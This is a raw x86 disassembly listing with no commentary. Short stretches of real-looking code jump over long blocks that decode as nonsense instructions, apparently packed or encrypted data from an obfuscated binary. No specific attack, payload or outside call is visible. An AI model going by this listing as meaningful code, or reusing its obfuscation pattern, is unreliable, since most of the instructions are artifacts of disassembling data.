  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	idiv   DWORD PTR [edx]
  409a5a:	retf   0x973a
  409a5d:	xchg   esp,ebp
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a77
  409a66:	mov    al,0x70
  409a68:	outs   dx,DWORD PTR ds:[esi]
  409a69:	cmc    
  409a6a:	inc    ecx
  409a6b:	retf   
  409a6c:	(bad)  
  409a6d:	in     eax,dx
  409a6e:	add    cl,BYTE PTR [ecx]
  409a70:	arpl   WORD PTR [ecx+0x4e],bp
  409a73:	pop    eax
  409a74:	data16 neg BYTE PTR [edi-0x73]
  409a78:	(bad)  
  409a79:	loop   0x409a68
  409a7b:	push   ds
  409a7c:	push   0xffffffa4
  409a7e:	xchg   esi,eax
  409a7f:	mov    DWORD PTR [ebx-0x13],ecx
  409a82:	(bad)  
  409a83:	sub    BYTE PTR [eax],bl
  409a85:	push   ds
  409a86:	cmp    BYTE PTR ds:0xc971b2b7,ah
  409a8c:	mov    WORD PTR [edi+0x56ea2ff0],cs
  409a92:	repz or BYTE PTR [ecx-0x59],bl
  409a96:	leave  
  409a97:	mov    ebp,0xd4dc755b
  409a9c:	fsubr  st(6),st
  409a9e:	imul   eax,ebx,0x62a7822e
  409aa4:	fidivr WORD PTR [eax]
  409aa6:	jns    0x409a3c
  409aa8:	xchg   ebx,eax
  409aa9:	aaa    
  409aaa:	leave  
  409aab:	out    dx,al
  409aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aad:	std    
  409aae:	add    ebp,DWORD PTR [edx+0x3a4485c1]
  409ab4:	xchg   ecx,eax
  409ab5:	jg     0x409a9a
  409ab7:	fadd   QWORD PTR [eax-0x7a]
  409aba:	scas   eax,DWORD PTR es:[edi]
  409abb:	adc    DWORD PTR [ecx*4-0x1dcf90ce],esi
  409ac2:	push   0xffffffec
  409ac4:	xchg   esp,eax
  409ac5:	in     al,0x83
  409ac7:	sbb    DWORD PTR [edx+0x50],edi
  409aca:	jbe    0x409a9c
  409acc:	adc    ax,0xc2ef
  409ad0:	fs fs mov ah,0xb2
  409ad4:	mov    esi,0xa1fd511d
  409ad9:	shr    dh,1
  409adb:	iret   
  409adc:	cmp    eax,0xb106210c
  409ae1:	jecxz  0x409a8a
  409ae3:	ins    DWORD PTR es:[edi],dx
  409ae4:	repnz icebp 
  409ae6:	mov    bl,0xa2
  409ae8:	dec    eax
  409ae9:	ja     0x409aab
  409aeb:	sbb    al,0xc8
  409aed:	shl    BYTE PTR [edx+0x78],cl
  409af0:	add    ch,BYTE PTR [edx]
  409af2:	pushf  
  409af3:	fcom   DWORD PTR [ecx-0x149e4b4c]
  409af9:	sbb    DWORD PTR [ecx],edi
  409afb:	mov    cl,0x95
  409afd:	dec    ebp
  409afe:	neg    DWORD PTR [edi]
  409b00:	ror    ch,1
  409b02:	sar    ebp,0x92
  409b05:	jo     0x409aa1
  409b07:	in     eax,dx
  409b08:	mov    BYTE PTR [ecx+ebp*8+0x32],cl
  409b0c:	stos   DWORD PTR es:[edi],eax
  409b0d:	jg     0x409b28
  409b0f:	inc    esp
  409b10:	ja     0x409ac5
  409b12:	inc    ebx
  409b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b15:	pop    ebp
  409b16:	mov    edi,0xde274834
  409b1b:	(bad)  
  409b1c:	scas   eax,DWORD PTR es:[edi]
  409b1d:	test   BYTE PTR [edi-0x4c],ah
  409b20:	je     0x409b3a
  409b22:	and    edi,ebx
  409b24:	or     DWORD PTR [eax-0x6b],ebx
  409b27:	cwde   
  409b28:	xchg   edx,eax
  409b29:	sbb    al,0x9d
  409b2b:	lahf   
  409b2c:	sbb    esi,DWORD PTR [ebx-0x29]
  409b2f:	mov    al,BYTE PTR [edx+0x52]
  409b32:	std    
  409b33:	mov    ecx,edx
  409b35:	cli    
  409b36:	popa   
  409b37:	dec    ecx
  409b38:	loope  0x409af1
  409b3a:	push   ss
  409b3b:	shl    DWORD PTR [edx],cl
  409b3d:	xchg   esi,eax
  409b3e:	pop    esi
  409b3f:	jmp    0x6339:0x42771517
  409b46:	mov    ebx,0xbb457f2a
  409b4b:	mov    eax,ds:0x3fe9c177
  409b50:	jno    0x409b13
  409b52:	out    dx,eax
  409b53:	std    
  409b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b55:	xchg   ebx,eax
  409b56:	test   DWORD PTR [ebx],ecx
  409b58:	adc    ecx,DWORD PTR [ecx+eax*4]
  409b5b:	and    ecx,DWORD PTR cs:[ecx]
  409b5e:	adc    DWORD PTR [esi-0xd0c5269],esi
  409b64:	xor    al,0x5f
  409b66:	jle    0x409ba5
  409b68:	js     0x409b76
  409b6a:	mov    eax,ds:0x3ffbbe9d
  409b6f:	cmp    esi,DWORD PTR [ecx]
  409b71:	into   
  409b72:	fdiv   st,st(3)
  409b74:	stos   DWORD PTR es:[edi],eax
  409b75:	jne    0x409b11
  409b77:	dec    edx
  409b78:	jle    0x409b31
  409b7a:	jo     0x409bed
  409b7c:	lock outs dx,DWORD PTR ds:[esi]
  409b7e:	aaa    
  409b7f:	push   edi
  409b80:	push   0xbb28b3bb
  409b85:	into   
  409b86:	outs   dx,BYTE PTR ds:[esi]
  409b87:	and    DWORD PTR [eax+0x68],edi
  409b8a:	fidivr DWORD PTR [ecx-0x783730b4]
  409b90:	inc    esi
  409b91:	fwait
  409b92:	ror    DWORD PTR [edx-0x6b25d9ad],0xce
  409b99:	pop    esp
  409b9a:	push   ecx
  409b9b:	das    
  409b9c:	iret   
  409b9d:	stos   DWORD PTR es:[edi],eax
  409b9e:	adc    eax,0xcaf3893b
  409ba3:	sub    al,0x16
  409ba5:	push   0xffffffca
  409ba7:	rcr    DWORD PTR [edi],0x1d
  409baa:	inc    eax
  409bab:	inc    ebp
  409bac:	inc    esi
  409bad:	inc    esi
  409bae:	iret   
  409baf:	mov    dh,0xcb
  409bb1:	mov    ebp,ebx
  409bb3:	sbb    al,0x11
  409bb5:	sbb    eax,0xd540c3d1
  409bba:	or     al,0x30
  409bbc:	xchg   esp,eax
  409bbd:	cmc    
  409bbe:	fadd   QWORD PTR [ecx+eiz*1-0x55dd492b]
  409bc5:	gs xchg esi,eax
  409bc7:	jg     0x409ba7
  409bc9:	out    dx,al
  409bca:	cmp    ebp,ebp
  409bcc:	adc    eax,0x3aeb1efb
  409bd1:	scas   al,BYTE PTR es:[edi]
  409bd2:	cli    
  409bd3:	jecxz  0x409c0e
  409bd5:	ins    BYTE PTR es:[edi],dx
  409bd6:	leave  
  409bd7:	sub    ah,BYTE PTR [edi+0x32ce2081]
  409bdd:	add    edx,eax
  409bdf:	scas   eax,DWORD PTR es:[edi]
  409be0:	push   ebp
  409be1:	xor    ch,BYTE PTR [edx-0x7369105a]
  409be7:	inc    edi
  409be8:	mov    bh,0x47
  409bea:	dec    ebx
  409beb:	add    dh,BYTE PTR [ebx+0x3]
  409bee:	push   esp
  409bef:	test   al,0xb4
  409bf1:	sbb    DWORD PTR [ebp*2-0x5b4902aa],0xffffff88
  409bf9:	mov    eax,0x431bdcea
  409bfe:	out    0x23,al
  409c00:	(bad)  
  409c01:	mov    ebx,0x58371494
  409c06:	inc    eax
  409c07:	inc    edi
  409c08:	sub    ebp,ecx
  409c0a:	lods   eax,DWORD PTR ds:[esi]
  409c0b:	mov    BYTE PTR [ecx-0x66775de2],bl
  409c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c12:	and    eax,0x6f58d14f
  409c17:	or     edi,ecx
  409c19:	stc    
  409c1a:	mov    cs,ebp
  409c1c:	test   eax,0x36e37448
  409c21:	push   edi
  409c22:	jne    0x409c86
  409c24:	xor    ebp,DWORD PTR [eax-0x71]
  409c27:	cmp    eax,0x5c42a393
  409c2c:	sub    BYTE PTR [ebx-0xf78188b],al
  409c32:	fidiv  DWORD PTR [edi+0x65]
  409c35:	sti    
  409c36:	je     0x409be6
  409c38:	sbb    bl,BYTE PTR [eax+0x8]
  409c3b:	xchg   esp,eax
  409c3c:	dec    eax
  409c3d:	jb     0x409bd9
  409c3f:	push   eax
  409c40:	push   es
  409c41:	fbstp  TBYTE PTR [ebp-0x3e0de0aa]
  409c47:	or     esi,ecx
  409c49:	rcl    al,0x7d
  409c4c:	mov    ecx,0xc8d7c2fb
  409c51:	lahf   
  409c52:	leave  
  409c53:	sar    esp,1
  409c55:	mov    ebx,0xafa5973
  409c5a:	ds push 0xef54b674
  409c60:	scas   al,BYTE PTR es:[edi]
  409c61:	xchg   esi,eax
  409c62:	jns    0x409c98
  409c64:	data16 fbld TBYTE PTR [edi+0x19]
  409c68:	xchg   edi,eax
  409c69:	into   
  409c6a:	addr16 aam 0x1f
  409c6d:	add    dl,BYTE PTR [esi+0x43]
  409c70:	xor    ah,BYTE PTR [edi]
  409c72:	daa    
  409c73:	lock jo 0x409cc4
  409c76:	jb     0x409c99
  409c78:	stos   BYTE PTR es:[edi],al
  409c79:	ins    BYTE PTR es:[edi],dx
  409c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c7b:	xchg   edx,eax
  409c7c:	rol    DWORD PTR [esi],1
  409c7e:	pusha  
  409c7f:	push   edi
  409c80:	(bad)  [edx-0x4ebb8d19]
  409c86:	and    al,0x9c
  409c88:	push   es
  409c89:	jnp    0x409c61
  409c8b:	xchg   ebp,eax
  409c8c:	xor    DWORD PTR ds:0x7f9fff7e,ecx
  409c92:	mov    bh,0xae
  409c94:	lea    esi,[esi-0x51c0f5bb]
  409c9a:	fmul   QWORD PTR [ecx-0x37f43aa4]
  409ca0:	ret    0xf0c7
  409ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ca4:	mov    ah,0x12
  409ca6:	sub    BYTE PTR [ecx+0x3e1f1691],ah
  409cac:	aas    
  409cad:	loope  0x409d2e
  409caf:	mov    cl,0xea
  409cb1:	ja     0x409cb3
  409cb3:	and    BYTE PTR [esi],dh
  409cb5:	push   ecx
  409cb6:	sub    eax,esp
  409cb8:	mov    ds:0xd55548d4,al
  409cbd:	fsubr  st(1),st
  409cbf:	dec    edi
  409cc0:	push   edi
  409cc1:	sahf   
  409cc2:	inc    edi
  409cc3:	sbb    cl,BYTE PTR [eax-0x7b52156e]
  409cc9:	push   ecx
  409cca:	(bad)  
  409ccb:	sub    al,0x78
  409ccd:	daa    
  409cce:	pop    esi
  409ccf:	fild   WORD PTR [edi-0x6010fb21]
  409cd5:	pop    ds
  409cd6:	sbb    BYTE PTR [edx],cl
  409cd8:	aad    0x8b
  409cda:	ret    0x5bab
  409cdd:	xchg   ecx,eax
  409cde:	xchg   ebp,eax
  409cdf:	pop    eax
  409ce0:	je     0x409d20
  409ce2:	test   BYTE PTR [esi],0xb9
  409ce5:	psubsb mm0,QWORD PTR [edi]
  409ce8:	inc    ebx
  409ce9:	mov    edx,0x79ec985f
  409cee:	stos   BYTE PTR es:[edi],al
  409cef:	xor    esi,DWORD PTR [ecx+0x0]
  409cf2:	das    
  409cf3:	fwait
  409cf4:	sahf   
  409cf5:	jg     0x409d6e
  409cf7:	jge    0x409d18
  409cf9:	fs pop edx
  409cfb:	fld    TBYTE PTR [ebx]
  409cfd:	cdq    
  409cfe:	popa   
  409cff:	xchg   ebx,eax
  409d00:	sahf   
  409d01:	cmp    BYTE PTR [esi+edx*1],dh
  409d04:	or     BYTE PTR [ebx+0x36],bl
  409d07:	fstp   QWORD PTR ds:0xc67ef9be
  409d0d:	stos   DWORD PTR es:[edi],eax
  409d0e:	rol    DWORD PTR [ebx-0x14],1
  409d11:	mov    bl,0xa
  409d13:	push   ebx
  409d14:	jmp    0x409d3a
  409d16:	and    DWORD PTR [ebp-0x31d2926],eax
  409d1c:	(bad)  
  409d1e:	push   0xf556a2af
  409d23:	mov    esi,0xab44b0f0
  409d28:	lea    esp,[edi+0x78f4d5cb]
  409d2e:	lock or esp,edi
  409d31:	jecxz  0x409cc5
  409d33:	jnp    0x409cf6
  409d35:	add    BYTE PTR [eax],bh
  409d37:	(bad)  [edi-0x54ee3511]
  409d3d:	sbb    al,0x41
  409d3f:	into   
  409d40:	or     ah,BYTE PTR [esi]
  409d42:	shr    DWORD PTR [ebx],1
  409d44:	ret    
  409d45:	loopne 0x409d88
  409d47:	out    0xc8,al
  409d49:	mov    eax,ds:0xb58fe237
  409d4e:	(bad)  
  409d4f:	xchg   edi,eax
  409d50:	pusha  
  409d51:	inc    edx
  409d52:	pushf  
  409d53:	cs retf 0xc127
  409d57:	jo     0x409d18
  409d59:	test   ebp,ebp
  409d5b:	leave  
  409d5c:	ins    DWORD PTR es:[edi],dx
  409d5d:	enter  0x1608,0xf6
  409d61:	scas   al,BYTE PTR es:[edi]
  409d62:	adc    BYTE PTR [ecx+0x1],dh
  409d65:	sbb    BYTE PTR [esi+0x67eb75d6],0x36
  409d6c:	lods   al,BYTE PTR ds:[esi]
  409d6d:	mov    esp,0x2be55d32
  409d72:	xchg   ebp,eax
  409d73:	inc    ebp
  409d74:	fsubr  DWORD PTR [esi-0x58eccb5d]
  409d7a:	mov    edx,0x7349e671
  409d7f:	mul    ebp
  409d81:	mov    WORD PTR [edx+0x8d535d0],fs
  409d87:	in     al,0x1a
  409d89:	adc    DWORD PTR [eax+0x73],edx
  409d8c:	cdq    
  409d8d:	cdq    
  409d8e:	lods   al,BYTE PTR ds:[esi]
  409d8f:	rol    BYTE PTR [esi+0x59],1
  409d92:	dec    edi
  409d93:	add    edx,DWORD PTR [esi]
  409d95:	shr    DWORD PTR [ebp+0x16a8fc5a],1
  409d9b:	ss test edi,ecx
  409d9e:	cmp    eax,0xc87899f7
  409da3:	stos   BYTE PTR es:[edi],al
  409da4:	mov    edi,0xf25c4408
  409da9:	sbb    al,0x34
  409dab:	or     edi,DWORD PTR [edi]
  409dad:	and    esi,edi
  409daf:	xchg   BYTE PTR [edx],dh
  409db1:	dec    esi
  409db2:	stos   DWORD PTR es:[edi],eax
  409db3:	into   
  409db4:	int    0x87
  409db6:	cdq    
  409db7:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  409db9:	pop    ss
  409dba:	pushf  
  409dbb:	adc    eax,0x87b6a6d0
  409dc0:	cmp    al,BYTE PTR [esp+esi*8+0x211b2803]
  409dc7:	xor    eax,0x312e3db6
  409dcc:	(bad)  
  409dcd:	(bad)  [ecx+ebp*4]
  409dd0:	stos   DWORD PTR es:[edi],eax
  409dd1:	dec    edx
  409dd2:	imul   DWORD PTR [edi-0x38]
  409dd5:	dec    eax
  409dd6:	lods   al,BYTE PTR ds:[esi]
  409dd7:	jno    0x409da7
  409dd9:	mov    cl,0x40
  409ddb:	jae    0x409da7
  409ddd:	mov    ebx,0x88460030
  409de2:	mov    dl,0xcd
  409de4:	add    al,0xda
  409de6:	and    DWORD PTR [esi+0x58],ebp
  409de9:	inc    edx
  409dea:	add    ebx,DWORD PTR [ebp+ebp*4-0x63d67087]
  409df1:	lahf   
  409df2:	call   0xa5d970d3
  409df7:	rol    DWORD PTR [ebp-0x487cdf6f],1
  409dfd:	cdq    
  409dfe:	push   edx
  409dff:	(bad)  
  409e00:	aaa    
  409e01:	xor    dh,BYTE PTR [ebx+0x3a]
  409e04:	inc    esp
  409e05:	jne    0x409e0a
  409e07:	shl    DWORD PTR [ecx],1
  409e09:	or     eax,0x42fd8a
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	adc    dl,bh
  409e83:	inc    esi
  409e84:	mov    esi,0x7070e826
  409e89:	lahf   
  409e8a:	jge    0x409efc
  409e8c:	jo     0x409ed1
  409e8e:	xor    DWORD PTR [eax+0xad90526],ebp
  409e94:	add    al,0x10
  409e96:	data16 cmp al,bl
  409e99:	and    eax,0x5fd98bf1
  409e9e:	jmp    0xd044abc0
  409ea3:	sbb    bh,ch
  409ea5:	retf   0x9877
  409ea8:	es pop ecx
  409eaa:	jmp    0x9976:0x9fdba288
  409eb1:	push   eax
  409eb2:	loopne 0x409f2b
  409eb4:	aam    0x4a
  409eb6:	jnp    0x409eb8
  409eb8:	xor    al,0x19
  409eba:	jecxz  0x409ed3
  409ebc:	cmp    eax,0x99091f7d
  409ec1:	lea    esi,[ecx+0x29]
  409ec4:	dec    edx
  409ec5:	sbb    ebx,eax
  409ec7:	mov    ds:0x381a5d92,eax
  409ecc:	pop    esi
  409ecd:	sbb    al,0x9e
  409ecf:	or     BYTE PTR [ebp+0x68fd81b8],0xab
  409ed6:	xor    bl,dh
  409ed8:	push   0x5aa0fc6f
  409edd:	mov    dl,BYTE PTR [ebp-0x78]
  409ee0:	out    dx,eax
  409ee1:	les    esi,FWORD PTR [esi+ebx*1-0x2a]
  409ee5:	inc    esp
  409ee6:	pushf  
  409ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ee8:	inc    edx
  409ee9:	cmp    eax,0x199eaa40
  409eee:	sub    DWORD PTR [ebx+0x602429fb],ecx
  409ef4:	cmp    bh,BYTE PTR [edi]
  409ef6:	add    edx,DWORD PTR ds:0x9ee6031d
  409efc:	pop    ecx
  409efd:	fisub  DWORD PTR [ecx+edi*1-0x53496a43]
  409f04:	ror    BYTE PTR [ebp-0xf],1
  409f07:	mov    WORD PTR [edi-0x718a795e],es
  409f0d:	mov    BYTE PTR [ebp+0x4c],0xa7
  409f11:	es xor eax,0x538ec5c7
  409f17:	xor    eax,DWORD PTR [eax+edx*8+0x49]
  409f1b:	stc    
  409f1c:	adc    cl,bh
  409f1e:	and    eax,0x13f74b0a
  409f23:	cmp    bl,BYTE PTR [ecx-0x16]
  409f26:	xchg   esi,eax
  409f27:	popf   
  409f28:	aam    0xbf
  409f2a:	mov    eax,ds:0xc8436e9a
  409f2f:	pushf  
  409f30:	pop    es
  409f31:	fcomp  DWORD PTR [ecx+0x40]
  409f34:	xchg   ebx,eax
  409f35:	repnz in eax,0x25
  409f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f39:	rol    DWORD PTR [esi-0x6050d9a5],1
  409f3f:	dec    edi
  409f40:	clc    
  409f41:	jg     0x409eea
  409f43:	xor    al,0x9f
  409f45:	fs nop
  409f47:	pop    ebx
  409f48:	adc    al,0xb1
  409f4a:	mov    esp,0xecf94b6d
  409f4f:	ins    DWORD PTR es:[edi],dx
  409f50:	push   edi
  409f51:	add    al,0xd5
  409f53:	in     eax,dx
  409f54:	and    ebp,DWORD PTR [edx+0x4dcdd07b]
  409f5a:	into   
  409f5b:	(bad)  
  409f5d:	dec    ebx
  409f5e:	xchg   edx,eax
  409f5f:	mov    eax,0xac388b1a
  409f64:	add    DWORD PTR [eax+eiz*1],ebp
  409f67:	test   BYTE PTR [ecx+0x17ea3c24],al
  409f6d:	push   ecx
  409f6f:	push   ebx
  409f70:	push   ecx
  409f71:	fcomp  QWORD PTR [ecx-0x1ed7cc5c]
  409f77:	test   DWORD PTR [edx-0x64],ebx
  409f7a:	mov    al,ds:0x49847b6a
  409f7f:	mov    cl,0x86
  409f81:	mov    edi,0x5c445ec
  409f86:	xchg   ebx,eax
  409f87:	out    0xc4,eax
  409f89:	rcr    dl,cl
  409f8b:	mov    eax,0xf25e96e6
  409f90:	pop    esp
  409f91:	fwait
  409f92:	leave  
  409f93:	xchg   ebx,eax
  409f94:	jbe    0x409f96
  409f96:	rol    BYTE PTR [eax+0xa],cl
  409f99:	xchg   ebx,eax
  409f9a:	fiadd  DWORD PTR [edx-0x31]
  409f9d:	nop
  409f9e:	lods   al,BYTE PTR ds:[esi]
  409f9f:	jno    0x409fe4
  409fa1:	mov    ebp,0x1584d14e
  409fa6:	mov    DWORD PTR [ecx+0x3c3e2248],esp
  409fac:	clc    
  409fad:	in     eax,dx
  409fae:	sbb    edi,edi
  409fb0:	(bad)  
  409fb1:	aas    
  409fb2:	lock mov ds:0x98ded13e,eax
  409fb8:	out    dx,eax
  409fb9:	pop    ebp
  409fba:	pop    ecx
  409fbb:	cwde   
  409fbc:	and    esp,ebx
  409fbe:	call   0x757d:0x7a65bf6d
  409fc5:	add    bl,BYTE PTR [edi+ebp*2-0x173122ac]
  409fcc:	adc    al,0x11
  409fce:	sti    
  409fcf:	aaa    
  409fd0:	pop    es
  409fd1:	adc    cl,BYTE PTR [edi-0x5eea55f]
  409fd7:	sbb    dh,0x77
  409fda:	and    dl,BYTE PTR [edx]
  409fdc:	rol    DWORD PTR [ebx+0x3dbc91f6],1
  409fe2:	xchg   ebx,eax
  409fe3:	adc    ah,BYTE PTR [ebx-0x2d32b92b]
  409fe9:	sub    eax,0x1baabffb
  409fee:	mov    cl,0x7d
  409ff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ff1:	stc    
  409ff2:	and    BYTE PTR [ebp+0x4d43dbc6],ah
  409ff8:	outs   dx,BYTE PTR ds:[esi]
  409ff9:	push   ebp
  409ffa:	jbe    0x40a029
  409ffc:	je     0x40a023
  409ffe:	sbb    esp,DWORD PTR [edx-0x7d875c14]
  40a004:	mov    ds:0x70d2c801,eax
  40a009:	repnz push 0xffffff83
  40a00c:	pop    eax
  40a00d:	ret    
  40a00e:	pop    esi
  40a00f:	retf   0x659d
  40a012:	mov    ecx,ecx
  40a014:	adc    DWORD PTR [eax],ebp
  40a016:	push   edx
  40a017:	aas    
  40a018:	retf   0xf201
  40a01b:	scas   eax,DWORD PTR es:[edi]
  40a01c:	les    edi,FWORD PTR [edi]
  40a01e:	sbb    DWORD PTR [ecx+0x1f29e1eb],0xfd33cc7f
  40a028:	ins    BYTE PTR es:[edi],dx
  40a029:	mov    dl,0x44
  40a02b:	jmp    0x460:0xbd90ce36
  40a032:	cmp    al,dl
  40a034:	dec    esp
  40a035:	push   ecx
  40a036:	enter  0xd97e,0xab
  40a03a:	ja     0x40a03a
  40a03c:	xchg   edx,eax
  40a03d:	aaa    
  40a03e:	sub    DWORD PTR [ebx-0x6a],edx
  40a041:	int    0x79
  40a043:	leave  
  40a044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a045:	pop    esi
  40a046:	mov    al,ds:0x4d2c62eb
  40a04b:	std    
  40a04c:	xchg   ebp,eax
  40a04d:	push   ebp
  40a04e:	cmovbe edx,DWORD PTR [ecx-0x1b96c60d]
  40a055:	and    eax,DWORD PTR [esi+0x468bfd1c]
  40a05b:	aam    0xd7
  40a05d:	push   ds
  40a05e:	sahf   
  40a05f:	les    esp,FWORD PTR [edx]
  40a061:	mov    dl,0xf8
  40a063:	xchg   esi,eax
  40a064:	mov    dh,BYTE PTR gs:[esi]
  40a067:	ins    BYTE PTR es:[edi],dx
  40a068:	cli    
  40a069:	fsub   QWORD PTR gs:[ebx-0x6]
  40a06d:	sub    eax,0x81f60aca
  40a072:	push   ss
  40a073:	dec    ecx
  40a074:	dec    ebx
  40a075:	xor    al,0xfa
  40a077:	jae    0x40a0db
  40a079:	mov    eax,ds:0x9abc68bd
  40a07e:	pop    eax
  40a07f:	inc    ebp
  40a080:	mov    ebx,0x56c9f0ac
  40a085:	sub    eax,0xe6a24129
  40a08a:	jmp    DWORD PTR [esi]
  40a08c:	add    al,0xc0
  40a08e:	pop    ss
  40a08f:	div    BYTE PTR [esi-0x427eefe1]
  40a095:	or     ah,ch
  40a097:	imul   esp,DWORD PTR [ebp+esi*2+0x0],0xa46ced23
  40a09f:	push   ds
  40a0a0:	jb     0x40a0ee
  40a0a2:	cmp    eax,0x20c8ad92
  40a0a7:	shl    BYTE PTR [ebx+esi*8],1
  40a0aa:	call   0x25ee8420
  40a0af:	(bad)  
  40a0b0:	mov    ds:0x6d85ac2c,eax
  40a0b5:	fistp  QWORD PTR [edx]
  40a0b7:	aaa    
  40a0b8:	pop    ss
  40a0b9:	pop    ss
  40a0ba:	push   ds
  40a0bb:	jnp    0x40a045
  40a0bd:	arpl   WORD PTR [esi],bx
  40a0bf:	cwde   
  40a0c0:	jl     0x40a04a
  40a0c2:	popa   
  40a0c3:	and    bh,0x9d
  40a0c6:	push   ebp
  40a0c7:	fucomi st,st(1)
  40a0c9:	mov    BYTE PTR [esi],ah
  40a0cb:	mov    cl,bl
  40a0cd:	inc    esi
  40a0ce:	sub    BYTE PTR [esi-0x65d0e1c9],dl
  40a0d4:	aas    
  40a0d5:	mov    DWORD PTR [ebx+0x54],edx
  40a0d8:	addr16 fs out 0xe3,eax
  40a0dc:	mov    eax,0x12ecdf8c
  40a0e1:	xchg   edi,eax
  40a0e2:	dec    ebx
  40a0e3:	jb     0x40a141
  40a0e5:	sbb    edx,DWORD PTR [eax+0x7c]
  40a0e8:	add    DWORD PTR [esi],ebp
  40a0ea:	xchg   ebp,eax
  40a0eb:	imul   edx,DWORD PTR [ebx],0xffffffa0
  40a0ee:	xor    dh,bl
  40a0f0:	fisubr DWORD PTR [ebx]
  40a0f2:	in     eax,dx
  40a0f3:	cld    
  40a0f4:	push   es
  40a0f5:	mov    edi,0x4cc8f13d
  40a0fa:	ins    BYTE PTR es:[edi],dx
  40a0fb:	(bad)  
  40a0fc:	push   esp
  40a0fe:	fiadd  DWORD PTR [edx-0x59b7090]
  40a104:	xchg   edx,eax
  40a105:	call   0xb4d6ccf9
  40a10a:	adc    eax,0xf0e44f7a
  40a10f:	rol    DWORD PTR [ecx-0x4831b4cf],1
  40a115:	mov    al,0x49
  40a117:	xchg   BYTE PTR [eax+0x495c5163],cl
  40a11d:	jmp    0xe9bb9209
  40a122:	pop    esi
  40a123:	test   eax,0x79e5fd98
  40a128:	xchg   edx,eax
  40a129:	inc    ebx
  40a12a:	sbb    cl,BYTE PTR [eax]
  40a12c:	push   0x1fbd328e
  40a131:	cwde   
  40a132:	cli    
  40a133:	scas   eax,DWORD PTR es:[edi]
  40a134:	sbb    al,0x10
  40a136:	jb     0x40a1ac
  40a138:	jmp    0xd90f:0x709824cb
  40a13f:	outs   dx,DWORD PTR ds:[esi]
  40a140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a141:	ret    
  40a142:	xchg   DWORD PTR [ecx+0x21],eax
  40a145:	aas    
  40a146:	icebp  
  40a147:	push   ss
  40a148:	adc    BYTE PTR [esi+0x17de4c3b],0xc
  40a14f:	push   cs
  40a150:	test   DWORD PTR [ecx+0x39df5d93],ebx
  40a156:	cmc    
  40a157:	fld    DWORD PTR [ecx+0x43]
  40a15a:	sbb    eax,0x4fd4227b
  40a15f:	jmp    FWORD PTR [eax]
  40a161:	xchg   BYTE PTR [ebx-0x7bd8eb48],ah
  40a167:	out    0x9f,eax
  40a169:	cmp    BYTE PTR ss:[ebp+0x1c],0x55
  40a16e:	rcl    edi,cl
  40a170:	mov    ebx,0xa039dd0e
  40a175:	into   
  40a176:	ror    BYTE PTR [edx+0x49adad65],cl
  40a17c:	repnz stos DWORD PTR es:[edi],eax
  40a17e:	sbb    eax,edi
  40a180:	mov    al,BYTE PTR [ecx+0x50]
  40a183:	adc    eax,0x337855ae
  40a188:	lods   al,BYTE PTR ds:[esi]
  40a189:	push   edx
  40a18a:	push   edi
  40a18b:	in     eax,dx
  40a18c:	push   ebx
  40a18d:	push   eax
  40a18e:	cmp    BYTE PTR ss:[edx],ah
  40a191:	lea    edx,[ebx]
  40a193:	aas    
  40a194:	shr    DWORD PTR [edi+edi*4-0x4d818b52],1
  40a19b:	into   
  40a19c:	or     BYTE PTR [edi],bh
  40a19e:	pop    esp
  40a19f:	rcl    DWORD PTR [edi-0x71],1
  40a1a2:	pushf  
